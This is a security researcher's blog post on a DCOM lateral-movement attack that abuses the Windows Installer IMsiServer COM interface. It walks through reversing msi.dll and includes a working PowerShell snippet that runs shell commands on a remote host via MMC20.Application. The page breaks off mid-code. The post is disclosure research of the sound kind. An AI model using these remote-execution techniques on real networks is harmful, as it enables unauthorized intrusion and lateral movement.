# https://www.deepinstinct.com/blog/forget-psexec-dcom-upload-execute-backdoor

<!DOCTYPE html><html class="scroll-smooth" lang="en"><body><div id="__next"><div class="page overflow-hidden"><div class="site-wide-alert bg-blue"><div class="container--full"><div class="container"><div class="site-wide-alert__content text-center py-2"><h2 class="site-wide-alert__title text-m my-1 mr-3 inline-block text-white">DIANNA, the DSX Companion, provides real-time explainability of the threats that matter.</h2><a class="inline-block font-bold uppercase text-cta tracking-widder undefined button_btn--link__RQBF4 undefined button_btn--arrow-yellow__LVTTd text-yellow" href="https://www.deepinstinct.com/news/deep-instinct-releases-next-generation-ai-analyst-to-provide-instant-explainability-of-never-before-seen-threats">Learn More<i class="button_btn__icon__m_ZnD"><svg width="16" height="10" viewBox="0 0 16 10" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><g stroke="currentColor"><path d="M10 2l4 3-4 3M13 5H0"></path></g><defs><clipPath id="clip0"><path fill="currentColor" d="M0 0h15v9H0z" transform="rotate(-180 8 5)"></path></clipPath></defs></svg></i></a></div></div></div></div><main role="main"><div class="blog-content BlogContent_blog-content__xmvuQ"><div class="blog-header"><div class="blog-header__image relative"><div class="absolute left-0 top-0 w-full h-4/5 bg-blue"></div><div class="container mx-auto"><div class="blog-header__image max-w-blog w-full mx-auto relative z-1 pt-9 mb-12"><a class="inline-block font-bold uppercase text-cta tracking-widder undefined button_btn--link__RQBF4 undefined button_btn--arrow-left__8dYK2 undefined button_btn--arrow-left-blue__c3n8m px-3.5 py-4 absolute left-0 z-1 uppercase !tracking-widest hover:underline bg-yellow text-blue BlogHeader_blog-header__back__Ju0lb" href="https://www.deepinstinct.com/blog">Back To Blog<i class="button_btn__icon__m_ZnD"><svg width="16" height="10" viewBox="0 0 16 10" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><g stroke="currentColor"><path d="M10 2l4 3-4 3M13 5H0"></path></g><defs><clipPath id="clip0"><path fill="currentColor" d="M0 0h15v9H0z" transform="rotate(-180 8 5)"></path></clipPath></defs></svg></i></a><img alt="" title="" aria-hidden="true" loading="lazy" width="930" height="400" decoding="async" data-nimg="1" style="width: 100%; height: auto; object-fit: cover;" src="https://www.deepinstinct.com/_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fbltc65864885392870f%2F67577170fc312a2844569a3d%2FDCOM_1200x627.jpg%3Fformat%3Djpg&amp;w=3840&amp;q=100" class="fallback-done"></div></div></div><div class="blog-header__content container mx-auto mb-12"><div class="max-w-blog w-full mx-auto pb-9 border-b-2 border-grey"><div class="flex justify-between mb-12"><div class="font-sans font-bold text-sm tracking-widest pt-2"><svg width="108" height="74" viewBox="0 0 108 74" class="icon inline-block align-middle w-3 h-auto text-blue mr-2 pb-0.5" preserveAspectRatio="xMaxYMax meet" focusable="false"><path fill="currentColor" d="M44.4768 35.7511l.1732 1.9185c.1506 4.5919 1.1008 9.1233 2.8086 13.3936 1.9192 4.3149 4.5894 8.2604 7.8879 11.656 3.3942 3.3069 7.3765 5.9611 11.7452 7.828 4.5389 1.9426 9.4284 2.9494 14.3714 2.9593h26.1259V58.1943H81.4631c-5.5289.025-10.8511-2.0845-14.8415-5.8825-3.9904-3.798-6.3365-8.987-6.5423-14.4702l-.1733-1.9186c-.1506-4.5918-1.1008-9.1232-2.8086-13.3935-1.9249-4.3117-4.5944-8.2564-7.8879-11.656-3.3912-3.31055-7.3743-5.96513-11.7452-7.82796C32.9045 1.18953 28.0212.242402 23.0929.258217L-1363.38.258097V15.3982l1386.4729.0001c5.5289-.0249 10.8511 2.0846 14.8415 5.8826 3.9904 3.798 6.3366 8.987 6.5424 14.4702z"></path><path fill="currentColor" d="M39.9171 37.1447l-.1733-1.9095c.0089-1.7374-.3483-3.4574-1.0487-5.0497l-1402.0751-.0001v14.4795l1403.9991.0001c-.4051-2.4759-.6396-4.9765-.702-7.4841M64.4654 30.0136c0 1.7375.1733 3.3031.1733 4.6968l.1732 1.9095c.0892 2.7814.9371 5.4868 2.4531 7.828h40.324V30.0136H64.4654zM63.0609 25.6608c1.9239-3.0828 4.6085-5.6274 7.7999-7.3932 3.1914-1.7657 6.7841-2.6941 10.4379-2.6973h26.2993V.611107L81.2439.611105c-4.9345-.082349-9.8312.867315-14.3714 2.787275-4.3397 1.74338-8.2745 4.34875-11.5627 7.65612 2.4133 2.9712 4.4158 6.2491 5.9546 9.7466.7914 1.5385 1.3799 3.1719 1.7508 4.8597M22.8829 73.3344c4.9442-.0262 9.8334-1.0323 14.3805-2.9592 4.3379-1.7468 8.272-4.3517 11.5628-7.6561-2.4166-2.969-4.4193-6.2472-5.9546-9.7464-.6902-1.6429-1.278-3.3263-1.76-5.0407-1.9239 3.0827-4.6085 5.6274-7.8 7.3931-3.1914 1.7657-6.784 2.6941-10.4379 2.6973l-1386.2537-.0001v15.312l1386.2629.0001z"></path></svg>NOVEMBER 25, 2024</div><div class="social-share SocialShare_social-share__4Q7V0"><button aria-label="linkedin" class="react-share__ShareButton social-share__btn linkedin hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="22" height="22" viewBox="0 0 22 22" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M4.58333 2.3913C4.58333 3.73043 3.575 4.78261 2.29167 4.78261C1.00833 4.78261 0 3.73043 0 2.3913C0 1.05217 1.00833 0 2.29167 0C3.575 0 4.58333 1.05217 4.58333 2.3913ZM4.58333 6.69565H0V22H4.58333V6.69565ZM11.9167 6.69565H7.33333V22H11.9167V13.9652C11.9167 9.46957 17.4167 9.08696 17.4167 13.9652V22H22V12.3391C22 4.78261 13.8417 5.06956 11.9167 8.8V6.69565Z" fill="currentColor"></path></svg></button><button aria-label="twitter" class="react-share__ShareButton social-share__btn twitter hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="23" height="19" viewBox="0 0 23 19" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M7.23329 19C15.9129 19 20.6595 11.6908 20.6595 5.35298C20.6595 5.14532 20.6553 4.93872 20.6459 4.73292C21.5673 4.05595 22.3683 3.21094 23 2.24946C22.1545 2.63129 21.2447 2.88841 20.2902 3.00434C21.2643 2.4106 22.0125 1.47093 22.3654 0.35098C21.4535 0.900584 20.4437 1.29996 19.3691 1.51533C18.5077 0.583106 17.2813 0 15.9244 0C13.3182 0 11.2048 2.14816 11.2048 4.79593C11.2048 5.17244 11.2464 5.53831 11.327 5.88956C7.40542 5.68934 3.92781 3.78048 1.60068 0.878514C1.19495 1.58712 0.961353 2.41086 0.961353 3.28911C0.961353 4.95308 1.79452 6.42214 3.06142 7.28178C2.28736 7.25758 1.56014 7.04114 0.924206 6.68165C0.92316 6.7016 0.92316 6.7218 0.92316 6.74281C0.92316 9.06593 2.55 11.0054 4.70893 11.4449C4.31261 11.5547 3.89564 11.6137 3.46505 11.6137C3.16108 11.6137 2.86548 11.5829 2.57799 11.5273C3.17861 13.4327 4.92082 14.8196 6.98635 14.8587C5.37102 16.1454 3.33635 16.9119 1.12563 16.9119C0.745015 16.9119 0.369369 16.8899 0 16.8455C2.08829 18.2058 4.56793 19 7.23329 19Z" fill="currentColor"></path></svg></button><button aria-label="facebook" class="react-share__ShareButton social-share__btn facebook hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="13" height="26" viewBox="0 0 13 26" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M3.25 8.66667H0V13H3.25V26H8.66667V13H12.5667L13 8.66667H8.66667V6.825C8.66667 5.85 8.88333 5.41667 9.85833 5.41667H13V0H8.88333C4.98333 0 3.25 1.73333 3.25 4.98333V8.66667Z" fill="currentColor"></path></svg></button></div></div><h1 class="text-h-md lg:text-h-lg mb-6">Forget PSEXEC: DCOM Upload &amp; Execute Backdoor</h1><div>Join Deep Instinct Security Researcher Eliran Nissan as he exposes a powerful new DCOM lateral movement attack that remotely writes custom payloads to create an embedded backdoor.</div><div class="blog-header__author mt-7 md:grid md:gap-4 md:grid-cols-3"><div class="mb-3 md:mb-0"><a class="author-teaser hover:underline AuthorTeaser_author-teaser__cItRk" href="https://www.deepinstinct.com/author/eliran-nissan"><span class="author-teaser__image block"><img alt="Eliran Nissan" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" class="rounded-full overflow-hidden" style="color:transparent;max-width:100%;height:auto" src="https://www.deepinstinct.com/_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fblta13ab1f9fc425c07%2F67576e36f53d9870a6375c5c%2Fdeep-145.jpg&amp;w=128&amp;q=75"></span><span class="author-teaser__content block text-m pt-2"><span class="font-semibold block">Eliran Nissan</span><span class="block">Security Researcher</span></span></a></div></div></div></div></div><div class="text-block container--full"><div class="container mx-auto relative mb-6 lg:mb-10 overflow-hidden"><div class="max-w-blog w-full mx-auto TextBlock_text__JUObc"><div class="paragraph-item"><h5>Executive Summary</h5><p></p><p>This blog post presents a powerful new DCOM lateral movement attack that allows the writing of custom DLLs to a target machine, loading them to a service, and executing their functionality with arbitrary parameters. This backdoor-like attack abuses the IMsiServer COM interface by reversing its internals. This process is described step-by-step in this blog. The research also includes a working POC tool to demonstrate the attack on the latest Windows builds.&nbsp;</p><p></p><h5><strong>Terminology</strong>&nbsp;</h5><p></p><h6>COM &amp; DCOM</h6><p></p><p>The Component Object Model (COM) is a Microsoft standard for creating binary software components that can interact. DCOM (Distributed COM) Remote Protocol extends the COM standard over a network using RPC by providing facilities for creating, activating, and managing objects found on a remote computer.&nbsp;</p><p></p><h6>Objects, Classes &amp; Interfaces</h6><p></p><p>In COM, an object is an instance of compiled code that provides some service to the rest of the system. A COM object's functionality depends on the interfaces its COM class implements.&nbsp;</p><p>The compiled code is defined as a COM class, which is identified by a globally unique Class ID (<strong>CLSID</strong>) that associates a class with its deployment in the file system, either DLL or EXE.&nbsp;</p><p>COM classes that can be remotely accessed (with DCOM) are identified with another globally unique identifier (GUID) - <strong>AppID</strong>.&nbsp;</p><p>A COM interface can be regarded as an abstract class. It specifies a contract that contains a set of methods that implementing classes must serve. All communication among COM components occurs through interfaces, and all services offered by a component are exposed through its interfaces, which can be represented with a globally unique Interface ID (<strong>IID</strong>). A COM class can implement several COM interfaces, and interfaces can be inherited from other interfaces.&nbsp;</p><p></p><h5>COM Interface As a C++ Class</h5><p></p><p>The C++ implementation of interfaces is done with classes. A C++ class is implemented as a struct, with its first member pointing to an array of member functions the class supports. This array is called a virtual table, or vtable for short<span style="color:rgb(209, 52, 56)">.</span>&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt578b7ffffc80a648" alt="fig-1-com-nterfaces-and-vtables.png" src="https://www.deepinstinct.com/image/blt578b7ffffc80a648/6757642df56c13400abd68af/fig-1-com-nterfaces-and-vtables.png" height="auto"><figcaption style="text-align:center">Figure 1: COM interfaces and vtables</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"><em></em></span></p><h5>DCOM Research History</h5><p></p><p>Lateral movement through DCOM is a well-known “thing” in cybersecurity, dating back to 2017 when <a href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/" target="_blank" rel="noopener"><u>Matt Nelson</u></a> revealed the first abuse of <em>MMC20.Application::ExecuteShellCommand</em> to run commands on remote systems. Using the <a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/" target="_blank" rel="noopener"><u>research process</u></a> Matt designed, researchers found <a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques" target="_blank" rel="noopener"><u>more DCOM objects</u></a> that expose an execution primitive on remote machines, among them:&nbsp;</p><ul><li><p><em>ShellBrowserWindow </em><strong>revealing </strong><em>ShellExecuteW, Navigate, </em><strong>and</strong><em> Navigate2&nbsp;</em></p></li></ul><ul><li><p><em>Excel.Application </em><strong>revealing</strong><em> ExecuteExcel4Macro, RegisterXLL&nbsp;</em></p></li></ul><ul><li><p><em>Outlook.Application </em><strong>revealing</strong><em> CreateObject&nbsp;</em></p></li></ul><p>The same research process was even <a href="https://www.scorpiones.io/articles/lateral-movement-using-dcom-objects" target="_blank" rel="noopener"><u>automated</u></a>, and it seemed like most of the DCOM attack surface was getting mapped thanks to it – as fewer attacks were revealed over time. In this blog post, I explain how I put the research process to the test to find a new DCOM lateral movement attack.</p><p></p><h5>The Known Method to Research DCOM</h5><p></p><p>Looking for a new DCOM lateral movement method follows the following steps:&nbsp;</p><ul><li><p>Search AppIDs on the machine for entries that have default launch and access permissions&nbsp;</p><ul><li>James Forshaw<strong>’</strong>s <a href="https://github.com/tyranid/oleviewdotnet" target="_blank" rel="noopener"><u>OleView .NET</u></a> tool correlates this data and other useful information&nbsp;</li></ul></li></ul><ul><li><p>AppIDs found with the prior criteria represent DCOM objects that are remotely accessible for users with a local admin privilege&nbsp;</p></li></ul><ul><li><p>Explore suspected objects, traditionally with PowerShell, which gives easy access to object creation, displaying interface methods &amp; properties, and invoking them&nbsp;</p></li></ul><ul><li><p>Repeat the prior step until a method that can run custom code has been located&nbsp;</p></li></ul><p>Here I am applying those steps to implement the known <em>MMC20.Application::ExecuteShellCommand</em> lateral movement attack:&nbsp;</p><ul><li><p>The AppID <em>7E0423CD-1119-0928-900C-E6D4A52A0715</em>, which hosts the <em>MMC20.Application</em> class, has default permissions&nbsp;</p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt0a779f903f3ef196" alt="fig-2-Mmc-Default-Premissions.png" src="https://www.deepinstinct.com/image/blt0a779f903f3ef196/6757642df53d9889e6375c0f/fig-2-Mmc-Default-Premissions.png" height="auto"><figcaption style="text-align:center">Figure 2: MMC default permissions</figcaption></div></figure><p>&nbsp;</p><ul><li><p>The AppID mentioned above maps to the CLSID <em>49B2791A-B1AE-4C90-9B8E-E860BA07F889</em>&nbsp;</p></li></ul><ul><li><p>Exploring the object created from said CLSID in PowerShell:&nbsp;</p></li></ul><pre>PS C<strong>:</strong>\<strong>&gt;</strong> <strong>$com</strong> <strong>=</strong> <strong>[</strong>Type<strong>]::</strong>GetTypeFromCLSID<strong>(</strong>"49B2791A-B1AE-4C90-9B8E-E860BA07F889"<strong>)<br bold="[object Object]"><br bold="[object Object]"></strong>PS C:\&gt; <strong>$mmcApp</strong> = [System.Activator]::CreateInstance<strong>($com)</strong><br bold="[object Object]"><br bold="[object Object]">PS C:\&gt; Get-Member -InputObject <strong>$mmcApp</strong><br bold="[object Object]"><br bold="[object Object]">TypeName: System.__ComObject#{a3afb9cc-b653-4741-86ab-f0470ec1384c}</pre><table><tbody><tr><td><strong>Name</strong></td><td><strong>MemberType</strong></td><td><strong>Definition</strong></td></tr><tr><td>Help</td><td>Method</td><td>void Help ()</td></tr><tr><td>Hide</td><td>Method</td><td>void Hide ()</td></tr><tr><td>Document</td><td>Property</td><td>Document Document () {get}</td></tr></tbody></table><p></p><ul><li><p>Repeating the queries on discovered properties reveals the method <em>ExecuteShellCommand</em> which allows RCE&nbsp;</p></li></ul><pre>&nbsp;PS C<strong>:</strong>\<strong>&gt;</strong> Get-Member <strong>-</strong>InputObject <strong>$mmcApp.</strong>Document<strong>.</strong>ActiveView<br><br>TypeName: System.__ComObject#{6efc2da2-b38c-457e-9abb-ed2d189b8c38}</pre><table><tbody><tr><td><strong>Name</strong></td><td><strong>MemberType</strong></td><td><strong>Definition</strong></td></tr><tr><td>Back</td><td>Method</td><td>void Back ()</td></tr><tr><td>Close</td><td>Method</td><td>void Close ()</td></tr><tr><td>ExecuteShellCommand</td><td>Method</td><td>void ExecuteShellCommand (string, string, string, string)</td></tr></tbody></table><p></p><ul><li><p>Finally, we create a DCOM session and invoke the method we found to complete the attack.&nbsp;</p></li></ul><pre>&lt;# MMCExec.ps1 #&gt;<br><br><strong>$com</strong> = [Type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", "TARGET.I.P.ADDR")<br><br><strong>$mmcApp</strong> = [System.Activator]::CreateInstance<strong>($com)</strong><br><br><strong>$mmcApp</strong>.Document.ActiveView.ExecuteShellCommand("file.exe", "/c commandline", "c:\file\folder",<strong>$null</strong>, 0)</pre><p><strong></strong></p><h5>The Query for a New Attack</h5><p></p><p>Using this recipe, I started searching for a new DCOM lateral movement attack. Here are my findings:&nbsp;</p><ul><li><p>AppID <em>000C101C-0000-0000-C000-000000000046</em> has default permissions, OleView .NET reveals the following details:&nbsp;</p></li></ul><ul><li><p>Hosted on the Windows Installer service (<em>msiexec.exe</em>)&nbsp;</p></li></ul><ul><li><p>Hosts a COM object named “<em>Msi install server</em>“ with a CLSID equal to the AppID&nbsp;</p></li></ul><ul><li><p>The object exposes an interface named <em>IMsiServer</em>, with an IID equal to the AppID&nbsp;</p></li></ul><ul><li><p>The class and interface are implemented in <em>msi.dll</em> (pointed from <em>ProxyStubClsid32</em> registry key)&nbsp;</p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltec4af8b13041099d" alt="fig-3-Msi-install-server.png" src="https://www.deepinstinct.com/image/bltec4af8b13041099d/6757642d30b280de20df2726/fig-3-Msi-install-server.png" height="auto"><figcaption style="text-align:center">Figure 3: Msi Install Server</figcaption></div></figure><p></p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blta21794dcce89faca" alt="fig-4-msi-install-server-default-permissions.png" src="https://www.deepinstinct.com/image/blta21794dcce89faca/6757642d4af80b82bcf0be8c/fig-4-msi-install-server-default-permissions.png" height="auto" width="auto"><figcaption style="text-align:center">Figure 4: Msi install server default permissions</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><ul><li><p>The name of the object and its location within the installer service piqued my interest, so I continued to query its methods with PowerShell:&nbsp;</p></li></ul><pre>PS C<strong>:</strong>\<strong>&gt;</strong> <strong>$com</strong> <strong>=</strong> <strong>[</strong>Type<strong>]::</strong>GetTypeFromCLSID<strong>(</strong>"000C101C-0000-0000-C000-000000000046"<strong>)<br bold="[object Object]"><br bold="[object Object]"></strong>PS C:\&gt; <strong>$obj</strong> = [System.Activator]::CreateInstance<strong>($com)</strong><br bold="[object Object]"><br bold="[object Object]">PS C:\&gt; Get-Member -InputObject <strong>$obj</strong><br bold="[object Object]"><br bold="[object Object]">TypeName: System.__ComObject</pre><table><tbody><tr><td><strong>Name</strong></td><td><strong>MemberType</strong></td><td><strong>Definition</strong></td></tr><tr><td>CreateObjRef</td><td>Method</td><td><p>System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType)</p></td></tr><tr><td>Equals</td><td>Method</td><td>boot Equals (System.Object obj)</td></tr><tr><td>GetHashCode</td><td>Method</td><td>int GetHashCode()</td></tr></tbody></table><p></p><p>The results describe generic .NET object methods, and the “TypeName” field does not point to the <em>IMsiServer</em> IID. This means the PowerShell runtime failed to query information on the <em>IMsiServer</em> object; we can't search for an attack this way.&nbsp;</p><p>The difference between the successful example of our MMC20.Application and our current <em>IMsiServer</em> is the <em>IDispatch</em> interface, which the former implements and the latter does not.&nbsp;&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt231797d62efbfe45" alt="fig-5-mmc-vs-msi.png" src="https://www.deepinstinct.com/image/blt231797d62efbfe45/6757642d30b280c659df272a/fig-5-mmc-vs-msi.png" height="auto"><figcaption style="text-align:center">Figure 5: MMC20.Application vs Msi install server</figcaption></div></figure><h5></h5><h5><span style="color:rgb(14, 40, 65)"></span>IDispatch</h5><p></p><p><em>IDispatch </em>is a fundamental COM interface<span style="color:rgb(209, 52, 56)">,</span> that allows scripting languages (VB, PowerShell) and higher-level languages (.NET) to interact with COM objects that implement it without prior knowledge. It achieves this by exposing unified methods that describe and interact with the implementing object. Among those methods are:&nbsp;</p><ul><li><p><em>IDispatch::GetIDsOfNames</em> maps names of methods or properties to an integer value named DISPID.&nbsp;</p></li></ul><ul><li><p><em>IDispatch::Invoke</em> calls one of the object's methods according to a DISPID.&nbsp;</p></li></ul><p>All of the known DCOM lateral movement attacks are built on documented IDispatch-based interfaces, allowing easy interaction through PowerShell. The ease of interacting with IDispatch interfaces blinded the security community to a large portion of possible attacks.&nbsp;</p><p>To solve this issue and further our research with <em>IMsiServer</em>, which lacks documentation and does not support IDispatch, we need to design an alternative approach that does not depend on PowerShell.&nbsp;</p><p>&nbsp;</p><h5><strong>Reversing Interface Definitions</strong></h5><p>&nbsp;</p><p>To learn more about <strong>IMsiServer</strong>, we must inspect the DLL containing the interface definition - msi.dll:&nbsp;</p><ul><li><p>Using IDA and searching msi.dll for the hex bytes representing the IID of <strong>IMsiServer </strong>- <em>1C 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46</em> we find a symbol named <em>IID_IMsiServer</em>.&nbsp;</p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt812d888f5e2d4b1a" alt="fig-6-ida-byte-search.png" src="https://www.deepinstinct.com/image/blt812d888f5e2d4b1a/6757642d9628e1990d1e3eae/fig-6-ida-byte-search.png" height="auto"><figcaption style="text-align:center">Figure 6: IDA byte search</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltb7450a33a9bb4908" alt="fig-7-the-result-symbol.png" src="https://www.deepinstinct.com/image/bltb7450a33a9bb4908/6757642d2c929d7140b24355/fig-7-the-result-symbol.png" height="auto"><figcaption style="text-align:center">Figure 7: The result symbol</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><ul><li><p>Cross referencing <em>IID_IMsiServer</em>, we find <em>CMsiServerProxy::QueryInterface</em>, which is a part of the client’s implementation for the <em>IMsiServer</em> interface.&nbsp;</p></li></ul><ul><li><p>Cross referencing <em>CMsiServerProxy::QueryInterface</em> reveals the interface’s vtable in the .rdata section:&nbsp;</p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt4a55c22517ab0233" alt="fig-8-CMsiServerProxy-vftable.png" src="https://www.deepinstinct.com/image/blt4a55c22517ab0233/6757642e1cd21ee1dac22f27/fig-8-CMsiServerProxy-vftable.png" height="auto"><figcaption style="text-align:center">Figure 8: CMsiServerProxy::`vftable'&nbsp;</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><p>With this data and some extra <a href="https://github.com/tongzx/nt5src" target="_blank" rel="noopener"><u>definitions, </u></a>I recreated the IMsiServer Interface:&nbsp;</p><pre>struct IMsiServer <strong>:</strong> IUnknown<br><br>{<br><br>&nbsp;&nbsp;&nbsp; virtual iesEnum InstallFinalize( iesEnum iesState,&nbsp; void* riMessage,&nbsp; boolean fUserChangedDuringInstall) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual IMsiRecord* SetLastUsedSource( const ICHAR* szProductCode,&nbsp; const wchar_t* szPath, boolean fAddToList,&nbsp; boolean fPatch) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual boolean Reboot() = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual int DoInstall( ireEnum ireProductCode,&nbsp; const ICHAR* szProduct,&nbsp; const ICHAR* szAction,const ICHAR* szCommandLine,&nbsp; const ICHAR* szLogFile,int iLogMode,&nbsp; boolean fFlushEachLine,&nbsp; IMsiMessage* riMessage,&nbsp; iioEnum iioOptions , ULONG, HWND__*, IMsiRecord&amp; ) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual HRESULT IsServiceInstalling() = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual IMsiRecord* RegisterUser( const ICHAR* szProductCode,&nbsp; const ICHAR* szUserName,const ICHAR* szCompany,&nbsp; const ICHAR* szProductID) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual IMsiRecord* RemoveRunOnceEntry( const ICHAR* szEntry) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual boolean CleanupTempPackages( IMsiMessage&amp; riMessage, bool flag) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual HRESULT SourceListClearByType(const ICHAR* szProductCode, const ICHAR*, isrcEnum isrcType) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual HRESULT SourceListAddSource( const ICHAR* szProductCode,&nbsp; const ICHAR* szUserName,&nbsp; isrcEnum isrcType,const ICHAR* szSource) = 0 ;<br><br>&nbsp;&nbsp;&nbsp; virtual HRESULT SourceListClearLastUsed( const ICHAR* szProductCode,&nbsp; const ICHAR* szUserName) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual HRESULT RegisterCustomActionServer( icacCustomActionContext* picacContext,&nbsp; const unsigned char* rgchCookie,&nbsp; const int cbCookie, IMsiCustomAction* piCustomAction,&nbsp; unsigned long* dwProcessId,&nbsp; IMsiRemoteAPI** piRemoteAPI,&nbsp; DWORD* dwPrivileges) = 0;<br><br>&nbsp;&nbsp;&nbsp; virtual HRESULT CreateCustomActionServer( const icacCustomActionContext icacContext,&nbsp; const unsigned long dwProcessId,&nbsp; IMsiRemoteAPI* piRemoteAPI,const WCHAR* pvEnvironment,&nbsp; DWORD cchEnvironment,&nbsp; DWORD dwPrivileges,&nbsp; char* rgchCookie,&nbsp; int* cbCookie,&nbsp; IMsiCustomAction** piCustomAction,&nbsp; unsigned long* dwServerProcessId,DWORD64 unused1, DWORD64 unused2) = 0;<br><br> [snip]<br><br>}</pre><p><strong></strong></p><h5>Remote Installations?</h5><p></p><p>The <em>DoInstall</em> function immediately stands out as a promising candidate to perform lateral movement <span style="color:rgb(209, 52, 56)">–</span> installing an MSI on a remote machine. However, an inspection of its server-side implementation at <em>CMsiConfigurationManager::DoInstall</em> shows it isn’t possible remotely:&nbsp;</p><pre>// Simplified pseudo code<br><br>CMsiConfigurationManager::DoInstall([snip])<br><br>{<br><br> [snip]<br><br><strong>  if</strong> (!OpenMutexW(SYNCHRONIZE, 0, L"Global\\_MSIExecute"))<br><br><strong>   return</strong> ERROR_INSTALL_FAILURE;<br><br> [snip]<br><br>}</pre><p></p><p>This code means when invoking a DCOM call for <em>IMsiServer::DoInstall</em>, the remote server will check the existence of a mutex named <em>Global\\_MSIExecute</em>. This mutex is not open by default, thus the call will fail.&nbsp;<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><p>Msi.dll creates this mutex from functions inaccessible to our <em>IMsiServer</em> interface, so we must find a different function to abuse <em>IMsiServer</em>.&nbsp;</p><p></p><h5>Remote Custom Actions</h5><p></p><p>My second candidate for abuse is:&nbsp;</p><pre>HRESULT IMsiServer<strong>::</strong>CreateCustomActionServer<strong>(<br bold="[object Object]"><br bold="[object Object]"></strong>&nbsp;&nbsp;&nbsp; const icacCustomActionContext icacContext,<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; const unsigned long dwProcessId,<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; IMsiRemoteAPI* piRemoteAPI,<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; const WCHAR* pvEnvironment,&nbsp;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; DWORD cchEnvironment,&nbsp;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; DWORD dwPrivileges,&nbsp;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; char* rgchCookie,&nbsp;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; int* cbCookie,&nbsp;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; IMsiCustomAction** piCustomAction,&nbsp;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; unsigned long* dwServerProcessId,<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; bool unkFalse);</pre><p></p><p>It creates the output COM object- <em>IMsiCustomAction** piCustomAction</em>, which, according to its name, can invoke a “custom action” on my remote target.<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><p>Reversing the server-side code in <em>CMsiConfigurationManager::CreateCustomActionServer</em> we learn it impersonates the DCOM client and creates a child <em>MSIEXEC.exe</em> with its identity, which hosts the result <em>IMsiCustomAction** piCustomAction&nbsp;</em></p><p>Searching <em>msi.dll</em> for symbols on <em>IMsiCustomAction</em> reveals its IID:&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltccc8628fb7cadce5" alt="fig-9-IDA-symbols-for-IID_IMsiCustomAction.png" src="https://www.deepinstinct.com/image/bltccc8628fb7cadce5/6757642eaf051b3fc013b44e/fig-9-IDA-symbols-for-IID_IMsiCustomAction.png" height="auto"><figcaption style="text-align:center">Figure 9: IDA symbols for IID_IMsiCustomAction</figcaption></div></figure><p></p><p>Using the symbol to perform the same cross-reference we did to discover <em>IMsiServer</em>, we can recreate <em>IMsiCustomAction</em>’s interface definition:&nbsp;</p><pre>IID IID_IMsiCustomAction <strong>=</strong> <strong>{</strong> 0x000c1025<strong>,</strong>0x0000<strong>,</strong>0x0000<strong>,{</strong>0xc0<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x46<strong>}</strong> <strong>};<br bold="[object Object]"><br bold="[object Object]"></strong>// Interface is trimmed for simplicty<br bold="[object Object]"><br bold="[object Object]">struct IMsiCustomAction : IUnknown<br bold="[object Object]"><br bold="[object Object]">{<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT 